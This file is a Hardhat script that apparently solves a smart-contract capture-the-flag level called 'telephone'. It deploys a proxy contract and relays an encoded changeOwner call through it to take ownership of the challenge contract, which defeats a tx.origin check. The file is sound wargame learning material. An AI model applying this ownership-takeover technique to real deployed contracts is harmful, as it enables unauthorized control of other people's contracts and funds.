import { ethers } from "hardhat";
// import { ethers } from "ethers";
import { getSigner } from "./signer";

import { ProxyCall } from "../typechain/ProxyCall";
import { BigNumber, BytesLike } from "ethers";
import { Interface } from "ethers/lib/utils";
import { createLevel, submitLevel } from "./utils";

async function main() {
  const signer = getSigner();
  const level = await createLevel(signer,"telephone");

  const factory = await ethers.getContractFactory("ProxyCall", signer);
  const proxy = await factory.deploy() as ProxyCall  
  await proxy.deployed();
  console.log("Proxy deployed to:", proxy.address);

  var abi = [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "changeOwner",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0xa6f9dae1"
    }
  ]
  
  const iface = new Interface(abi);
  const formatData: BytesLike = iface.encodeFunctionData("changeOwner", [await signer.getAddress()]);
  console.log(formatData)
  const tx = await proxy.proxy(level, formatData, {gasLimit:112000});
  const receipt = await tx.wait();
  console.log(receipt);
  await submitLevel(signer, level);

}
main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
